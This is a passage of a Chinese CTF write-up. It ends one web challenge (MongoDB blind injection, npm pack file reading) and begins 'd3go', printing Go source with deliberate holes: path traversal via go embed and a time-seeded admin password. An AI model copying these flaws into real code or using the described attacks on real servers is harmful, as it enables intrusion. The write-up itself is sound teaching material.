class="string">&quot;MIT&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后最后通过show路由就可以成功进行文件查看了</p><p><img src="../images/image-20230504201002030.png" alt="image-20230504201002030"></p><p>先去  <code>url/dashboardIndex/SetDependencies</code>  这个网址来进行<strong>package.json</strong>内容的修改</p><p><img src="../images/image-20230504205510103.png" alt="image-20230504205510103"></p><p><strong>这里是别忘改了，不然上传不成功</strong></p><p>然后去<code>url/dashboardIndex/PackDependencies</code>路由进行npm pack 重新加载json数据，然后进行exec数据的执行</p><p><img src="../images/image-20230504202007954.png" alt="image-20230504202007954"></p><p>然后去<code>url/dashboardIndex/ShowExampleFile</code>路由进行文件的读取</p><p><img src="../images/image-20230504205542586.png" alt="image-20230504205542586"></p><p>成功</p><p><strong>这里考察的nosql的MongoDB盲注，app黑名单绕过，nodejs代码审计，npm pack的重新加载</strong></p><p>这道题能学到挺多东西的</p><h2 id="d3go"><a href="#d3go" class="headerlink" title="d3go"></a>d3go</h2><p><strong>bs是go编程语言的新手，最近发现新特性“go embed”很有意思。他写了一个在线解压服务，使用go embed打包静态资源文件。您的任务是利用此应用程序的漏洞，对其进行 RCE 并获取标志。</strong></p><p><strong>一开始会显示ERR_EMPTY_RESPONSE，请稍候刷新！</strong></p><p><strong>提示：</strong></p><p><strong>d3go 的Gamebox 无法连接到Internet。</strong></p><p>题目</p><p><img src="../images/image-20230505192100368.png" alt="image-20230505192100368"></p><p><code>go embed</code> 的错误使用导致源代码被打包到程序中。</p><p>这与不正确的静态文件服务相结合，导致/../路径列表⽬录以获取源代码。</p><p><img src="../images/image-20230505192841822.png" alt="image-20230505192841822"></p><p><strong>main.go</strong></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;crypto/rand&quot;</span></span><br><span class="line"><span class="string">&quot;d3go/config&quot;</span></span><br><span class="line"><span class="string">&quot;d3go/controller&quot;</span></span><br><span class="line"><span class="string">&quot;d3go/db&quot;</span></span><br><span class="line"><span class="string">&quot;d3go/middleware&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/gin-contrib/sessions&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/gin-contrib/sessions/cookie&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/jpillora/overseer&quot;</span></span><br><span class="line">log <span class="string">&quot;github.com/sirupsen/logrus&quot;</span></span><br><span class="line"><span class="string">&quot;net/http&quot;</span></span><br><span class="line"><span class="string">&quot;strings&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">prog</span><span class="params">(state overseer.State)</span></span> &#123;</span><br><span class="line">r := gin.Default()</span><br><span class="line">InitRouter(r)</span><br><span class="line">server := http.Server&#123;</span><br><span class="line">Addr:    <span class="string">&quot;:8080&quot;</span>,</span><br><span class="line">Handler: r,</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> err := server.Serve(state.Listener); err != <span class="literal">nil</span> &amp;&amp; err != http.ErrServerClosed &#123;</span><br><span class="line">log.Fatal(err)</span><br><span class="line">&#125;</span><br><span class="line">&#125;()</span><br><span class="line">&lt;-state.GracefulShutdown</span><br><span class="line"><span class="keyword">if</span> err := server.Shutdown(<span class="literal">nil</span>); err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatal(err)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">config.Init()</span><br><span class="line">db.Init()</span><br><span class="line"><span class="keyword">if</span> config.Conf.AutoUpdate &#123;</span><br><span class="line">log.Printf(<span class="string">&quot;Auto update enabled&quot;</span>)</span><br><span class="line">err := overseer.RunErr(overseer.Config&#123;</span><br><span class="line">Program: prog,</span><br><span class="line">Address: <span class="string">&quot;:8080&quot;</span>,</span><br><span class="line">Fetcher: &amp;config.Fetch,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatalln(err)</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">r := gin.Default()</span><br><span class="line">InitRouter(r)</span><br><span class="line"><span class="keyword">if</span> err := r.Run(<span class="string">&quot;:8080&quot;</span>); err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatal(err)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">InitRouter</span><span class="params">(r *gin.Engine)</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> rad [<span class="number">32</span>]<span class="type">byte</span></span><br><span class="line">rand.Read(rad[:])</span><br><span class="line">store := cookie.NewStore(rad[:])</span><br><span class="line">r.Use(sessions.Sessions(<span class="string">&quot;mysession&quot;</span>, store))</span><br><span class="line">r.POST(<span class="string">&quot;/login&quot;</span>, controller.Login)</span><br><span class="line">r.POST(<span class="string">&quot;/register&quot;</span>, controller.Register)</span><br><span class="line">r.GET(<span class="string">&quot;/*filepath&quot;</span>, ServeFile)</span><br><span class="line">r.HEAD(<span class="string">&quot;/*filepath&quot;</span>, ServeFile)</span><br><span class="line">admin := r.Group(<span class="string">&quot;/admin&quot;</span>)</span><br><span class="line">admin.Use(middleware.Auth())</span><br><span class="line">admin.POST(<span class="string">&quot;/upload&quot;</span>, controller.Upload)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">ServeFile</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line"><span class="comment">// unzipped file server</span></span><br><span class="line">p := c.Param(<span class="string">&quot;filepath&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> strings.HasPrefix(p, <span class="string">&quot;/unzipped&quot;</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(p) == <span class="number">9</span> &#123;</span><br><span class="line">p = <span class="string">&quot;/&quot;</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">p = p[<span class="number">9</span>:]</span><br><span class="line">&#125;</span><br><span class="line">c.FileFromFS(p, http.Dir(<span class="string">&quot;./unzipped&quot;</span>))</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// embed static file server</span></span><br><span class="line">p = <span class="string">&quot;/static/&quot;</span> + c.Param(<span class="string">&quot;filepath&quot;</span>)</span><br><span class="line">c.FileFromFS(p, http.FS(Static))</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>config.go</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> config</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;github.com/fsnotify/fsnotify&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/jpillora/overseer/fetcher&quot;</span></span><br><span class="line">log <span class="string">&quot;github.com/sirupsen/logrus&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/spf13/viper&quot;</span></span><br><span class="line"><span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> Conf config</span><br><span class="line"><span class="keyword">var</span> Fetch fetcher.HTTP</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> config <span class="keyword">struct</span> &#123;</span><br><span class="line">NoAdminLogin <span class="type">bool</span></span><br><span class="line">DBUser       <span class="type">string</span></span><br><span class="line">DBPasswd     <span class="type">string</span></span><br><span class="line">DBHost       <span class="type">string</span></span><br><span class="line">DBPort       <span class="type">string</span></span><br><span class="line">AutoUpdate   <span class="type">bool</span></span><br><span class="line">UpdateUrl    <span class="type">string</span></span><br><span class="line">UpdateTime   time.Duration</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Init</span><span class="params">()</span></span> &#123;</span><br><span class="line">viper.SetConfigName(<span class="string">&quot;config&quot;</span>)</span><br><span class="line">viper.SetConfigType(<span class="string">&quot;yaml&quot;</span>)</span><br><span class="line">viper.AddConfigPath(<span class="string">&quot;.&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err := viper.ReadInConfig(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatalln(err)</span><br><span class="line">&#125;</span><br><span class="line">UpdateConfig()</span><br><span class="line">viper.OnConfigChange(<span class="function"><span class="keyword">func</span><span class="params">(in fsnotify.Event)</span></span> &#123;</span><br><span class="line">UpdateConfig()</span><br><span class="line">&#125;)</span><br><span class="line">viper.WatchConfig()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">UpdateConfig</span><span class="params">()</span></span> &#123;</span><br><span class="line">Conf.DBUser = viper.GetString(<span class="string">&quot;database.user&quot;</span>)</span><br><span class="line">Conf.DBPasswd = viper.GetString(<span class="string">&quot;database.password&quot;</span>)</span><br><span class="line">Conf.DBHost = viper.GetString(<span class="string">&quot;database.host&quot;</span>)</span><br><span class="line">Conf.DBPort = viper.GetString(<span class="string">&quot;database.port&quot;</span>)</span><br><span class="line">Conf.NoAdminLogin = viper.GetBool(<span class="string">&quot;server.noAdminLogin&quot;</span>)</span><br><span class="line">Conf.AutoUpdate = viper.GetBool(<span class="string">&quot;update.enabled&quot;</span>)</span><br><span class="line">Fetch = fetcher.HTTP&#123;</span><br><span class="line">URL:      viper.GetString(<span class="string">&quot;update.url&quot;</span>),</span><br><span class="line">Interval: viper.GetDuration(<span class="string">&quot;update.interval&quot;</span>) * time.Second,</span><br><span class="line">&#125;</span><br><span class="line">Fetch.Init()</span><br><span class="line">log.Println(<span class="string">&quot;config updated&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>controller.go</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> controller</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;d3go/model&quot;</span></span><br><span class="line"><span class="string">&quot;d3go/service/auth&quot;</span></span><br><span class="line"><span class="string">&quot;d3go/service/upload&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/gin-contrib/sessions&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/google/uuid&quot;</span></span><br><span class="line"><span class="string">&quot;path&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Resp <span class="keyword">struct</span> &#123;</span><br><span class="line">StatusCode <span class="type">int</span>    <span class="string">`json:&quot;status_code&quot;`</span></span><br><span class="line">StatusMsg  <span class="type">string</span> <span class="string">`json:&quot;status_msg,omitempty&quot;`</span></span><br><span class="line">Data       any    <span class="string">`json:&quot;data&quot;`</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> ErrFormatError = <span class="string">&quot;format error&quot;</span></span><br><span class="line"><span class="keyword">var</span> ErrInternalServer = <span class="string">&quot;internal server error&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Login</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">u := &amp;model.User&#123;&#125;</span><br><span class="line">err := c.ShouldBindJSON(u)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.JSON(<span class="number">200</span>, Resp&#123;</span><br><span class="line">StatusCode: <span class="number">-1</span>,</span><br><span class="line">StatusMsg:  ErrFormatError,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">permission, err := auth.Login(u)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.JSON(<span class="number">200</span>, Resp&#123;</span><br><span class="line">StatusCode: <span class="number">-1</span>,</span><br><span class="line">StatusMsg:  ErrInternalServer,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">session := sessions.Default(c)</span><br><span class="line"><span class="keyword">switch</span> permission &#123;</span><br><span class="line"><span class="keyword">case</span> auth.UnAuthed:</span><br><span class="line">c.JSON(<span class="number">200</span>, Resp&#123;</span><br><span class="line">StatusCode: <span class="number">-1</span>,</span><br><span class="line">StatusMsg:  <span class="string">&quot;login fail&quot;</span>,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">case</span> auth.User:</span><br><span class="line">session.Set(<span class="string">&quot;admin&quot;</span>, <span class="literal">false</span>)</span><br><span class="line">session.Save()</span><br><span class="line">c.JSON(<span class="number">200</span>, Resp&#123;</span><br><span class="line">StatusCode: <span class="number">0</span>,</span><br><span class="line">StatusMsg:  <span class="string">&quot;login success&quot;</span>,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">case</span> auth.Admin:</span><br><span class="line">session.Set(<span class="string">&quot;admin&quot;</span>, <span class="literal">true</span>)</span><br><span class="line">session.Save()</span><br><span class="line">c.JSON(<span class="number">200</span>, Resp&#123;</span><br><span class="line">StatusCode: <span class="number">0</span>,</span><br><span class="line">StatusMsg:  <span class="string">&quot;login as admin success&quot;</span>,</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Register</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> u model.User</span><br><span class="line">err := c.ShouldBindJSON(&amp;u)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.JSON(<span class="number">200</span>, Resp&#123;</span><br><span class="line">StatusCode: <span class="number">-1</span>,</span><br><span class="line">StatusMsg:  ErrFormatError,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">err = auth.Register(&amp;u)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.JSON(<span class="number">200</span>, Resp&#123;</span><br><span class="line">StatusCode: <span class="number">-1</span>,</span><br><span class="line">StatusMsg:  ErrInternalServer,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">c.JSON(<span class="number">200</span>, Resp&#123;</span><br><span class="line">StatusCode: <span class="number">0</span>,</span><br><span class="line">StatusMsg:  <span class="string">&quot;register success&quot;</span>,</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Upload</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">f, err := c.FormFile(<span class="string">&quot;file&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.JSON(<span class="number">500</span>, Resp&#123;</span><br><span class="line">StatusCode: <span class="number">-1</span>,</span><br><span class="line">StatusMsg:  <span class="string">&quot;upload fail&quot;</span>,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (f.Header.Get(<span class="string">&quot;Content-Type&quot;</span>) != <span class="string">&quot;application/zip&quot;</span> &amp;&amp; f.Header.Get(<span class="string">&quot;Content-Type&quot;</span>) != <span class="string">&quot;application/x-zip-compressed&quot;</span>) || path.Ext(f.Filename) != <span class="string">&quot;.zip&quot;</span> &#123;</span><br><span class="line">c.JSON(<span class="number">500</span>, Resp&#123;</span><br><span class="line">StatusCode: <span class="number">-1</span>,</span><br><span class="line">StatusMsg:  <span class="string">&quot;not a zip file&quot;</span>,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">uu := uuid.New()</span><br><span class="line"></span><br><span class="line">zipPath := path.Join(<span class="string">&quot;upload&quot;</span>, uu.String()+<span class="string">&quot;.zip&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err := c.SaveUploadedFile(f, zipPath); err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.JSON(<span class="number">500</span>, Resp&#123;</span><br><span class="line">StatusCode: <span class="number">-1</span>,</span><br><span class="line">StatusMsg:  <span class="string">&quot;save zip fail&quot;</span>,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">tree, err := upload.Unzip(zipPath, path.Join(<span class="string">&quot;unzipped&quot;</span>, uu.String()))</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.JSON(<span class="number">500</span>, Resp&#123;</span><br><span class="line">StatusCode: <span class="number">-1</span>,</span><br><span class="line">StatusMsg:  <span class="string">&quot;upload fail&quot;</span>,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">c.JSON(<span class="number">200</span>, Resp&#123;</span><br><span class="line">StatusCode: <span class="number">0</span>,</span><br><span class="line">StatusMsg:  <span class="string">&quot;upload success&quot;</span>,</span><br><span class="line">Data:       tree.Children,</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>db.go</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> db</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;d3go/config&quot;</span></span><br><span class="line"><span class="string">&quot;d3go/model&quot;</span></span><br><span class="line"><span class="string">&quot;encoding/hex&quot;</span></span><br><span class="line"><span class="string">&quot;errors&quot;</span></span><br><span class="line">log <span class="string">&quot;github.com/sirupsen/logrus&quot;</span></span><br><span class="line"><span class="string">&quot;math/rand&quot;</span></span><br><span class="line"><span class="string">&quot;time&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;gorm.io/driver/mysql&quot;</span></span><br><span class="line"><span class="string">&quot;gorm.io/gorm&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> ErrDatabase = errors.New(<span class="string">&quot;database error&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> db *gorm.DB</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Init</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> err := tryOpen(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatalln(err)</span><br><span class="line">&#125;</span><br><span class="line">err := db.AutoMigrate(&amp;model.User&#123;&#125;)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatalln(err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// create admin</span></span><br><span class="line">rand.Seed(time.Now().UnixMicro())</span><br><span class="line"><span class="keyword">var</span> rad [<span class="number">32</span>]<span class="type">byte</span></span><br><span class="line">rand.Read(rad[:])</span><br><span class="line"><span class="keyword">if</span> ok, _ := IsFirstRegistered(); ok &#123;</span><br><span class="line">db.Save(&amp;model.User&#123;</span><br><span class="line">Username: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">Password: hex.EncodeToString(rad[:]),</span><br><span class="line">&#125;)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">tryOpen</span><span class="params">()</span></span> <span class="type">error</span> &#123;</span><br><span class="line"><span class="keyword">var</span> err <span class="type">error</span></span><br><span class="line"><span class="keyword">var</span> database *gorm.DB</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">100</span>; i++ &#123;</span><br><span class="line">database, err = gorm.Open(mysql.Open(config.Conf.DBUser+<span class="string">&quot;:&quot;</span>+config.Conf.DBPasswd+<span class="string">&quot;@tcp(&quot;</span>+config.Conf.DBHost+<span class="string">&quot;:&quot;</span>+config.Conf.DBPort+<span class="string">&quot;)/db?parseTime=True&quot;</span>), &amp;gorm.Config&#123;&#125;)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">time.Sleep(time.Second * <span class="number">3</span>)</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line">db = database</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">IsAdmin</span><span class="params">(u *model.User)</span></span> <span class="type">bool</span> &#123;</span><br><span class="line"><span class="keyword">var</span> admin model.User</span><br><span class="line"><span class="keyword">if</span> err := db.First(&amp;admin).Error; err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Error(err)</span><br><span 